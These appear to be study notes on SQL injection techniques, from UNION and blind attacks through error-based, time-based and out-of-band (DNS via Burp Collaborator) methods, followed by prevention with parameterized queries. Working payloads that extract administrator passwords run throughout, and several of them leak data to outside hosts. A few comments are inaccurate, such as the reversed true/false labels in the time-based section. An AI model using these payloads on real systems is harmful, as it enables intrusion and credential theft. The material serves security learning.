
# SQL Injection (SQLI) Notes

## What is SQL Injection (SQLI)?
- A web security vulnerability that alters the main query sent from an application to the database.
- Allows attackers to access unauthorized data.
- Often occurs in the WHERE clause of SELECT queries.
- Can escalate to compromise the server, such as gaining administrator access.

## Basic SQLI
- Utilizes single quotes (`'`) to probe for anomalous responses.
- Boolean conditions employed: `OR 1=1`, `OR 1=2` (FALSE), `OR 'a' = 'b'` (making it TRUE).

## SQLI UNION Attacks
- Exploits applications vulnerable to SQLI to retrieve data from different tables using `UNION`.
- `UNION` combines the results of two or more SELECT queries.
- Requirements:
  - Both queries must return the same number of columns.
  - Data types must be compatible.
- Techniques for determining the number of columns:
  - Increment the `ORDER BY` clause until an error occurs (e.g., `ORDER BY 1--`, `ORDER BY 2--`).
  - Use `UNION SELECT` with varying numbers of NULLs.

## Oracle SQLI
- The `SELECT` query must include the `FROM` keyword.
- Utilizes the built-in table "dual" (e.g., `' UNION SELECT NULL FROM DUAL--`).
- Combines column values with a delimiter for queries returning single column values (e.g., `' UNION SELECT username || '~' || password FROM users--`).

## MySQL SQLI
- Comments require a space after `--`.
- The `#` character can also denote a comment.
- Identifying columns with useful data types:
  - Use `UNION SELECT` payloads to test for string-type columns.

## Blind SQLI
- Occurs when the application is vulnerable to SQLI but the HTTP response does not contain the query result.
- Allows attackers to infer information based on differing server responses.
- Ineffective with UNION attacks.

## Blind SQLI Query Example
- Cookie TrackingID header in application uses SQL query to trace user data analytics.
-	Example query of Cookie TrackingID:
-	SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
-	It can be exploited through blind SQLI vulnerability.
-	eg of exploit: xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
-	force a true condition and return password where first character is greater than m.
-	possible attacks:use Boolean to determine the true false of the criteria, eg: if the password length is more than x, starts with what alphabet
-	then brute force base on response to get credentials.


## Error-Based SQLI
-	Using error to extract or infer sensitive data.
-	Boolean condition might and might not work.
-	eg: ' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a 
-	eg: '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-	Can also extract sensitive data through verbose SQL errors when certain data is returned by the query.
-	Using CAST() function to convert data types when conditional responses is prevented.
-	eg: CAST((SELECT example_column FROM example_table) AS int)
-	Example of working Error-Based SQLI that returns the data through error message:
  -	' AND 1=CAST((SELECT username FROM users LIMIT 1)AS INT)—
  -	' AND 1=CAST((SELECT password FROM users LIMIT 1)AS INT)—


## Time-based SQLI
-	If the database can handle error of the query from error-based SQLI, time-based SQLI can be tested to see the response timing of the time delay.
-	Database type specific queries.
-	eg: '; IF (1=2) WAITFOR DELAY '0:0:10'— (wont trigger time delay as it is true condition)
-	eg: '; IF (1=1) WAITFOR DELAY '0:0:10'--  (trigger time delay as it is false condition)
-	Example of working Time-based SQLI:
-	';SELECT+CASE+WHEN+(username='administrator' AND SUBSTRING(password,20,1)='§a§')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END FROM users--

## OAST SQLI (Out-of-band Application Security Testing)
-	A variation of Blind SQLI.
-	Makes the server to interact with another system under attacker’s control through another protocol (mainly DNS).
-	Uses burp collaborator to detect network interaction.
-	eg:'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'—
-	The query ran on Microsoft SQL Server will cause DNS lookup on specific domain (0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net).
-	Example of using UNION and XXE to cause the database to run DNS lookup on collaborator subdomain:
  -	'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual—
-	Example of having SQLI in OAST to leak data:
  -	'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')—
  -	'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.upneavivflfs9z2xmz65vswzbqhi59ty.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual—
  -	The leaked data will be within the subdomain name: p4ssword. cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net

## Bypassing SQLI Filters
-	Using hackvector extension in burpsuite to encode the payload to dec_entities or hex_entities allows xml WAP bypass.
-	eg: <@dec_entities>1 UNION SELECT username || '~' || password FROM users;<@/dec_entities>

## Checking Database version:
-	MySQL: SELECT @@version
-	Oracle: SELECT * FROM v$version
-	PostgreSQL: SELECT version()

## Database Schema:
-	SELECT * FROM information_schema.tables
-	SELECT * FROM information_schema.columns WHERE table_name = 'Users'

## SQLI Prevention:
-	The following code is vulnerable to SQLI due to direct execution of user input by having it directly concatenated into the query
  -	String query = "SELECT * FROM products WHERE category = '"+ input + "'";
  -	Statement statement = connection.createStatement();
  -	ResultSet resultSet = statement.executeQuery(query);
-	To fix the code make the user input to not interfere with the SQL query:
  -	PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
  -	statement.setString(1, input);
  -	ResultSet resultSet = statement.executeQuery();
-	By parameterizing the query, user input can’t affect the main query. Such as:
  -	whitelisting inputs.
  -	using different logic 
  -	hard-coded constant 
  -	not contain any variable data from origin

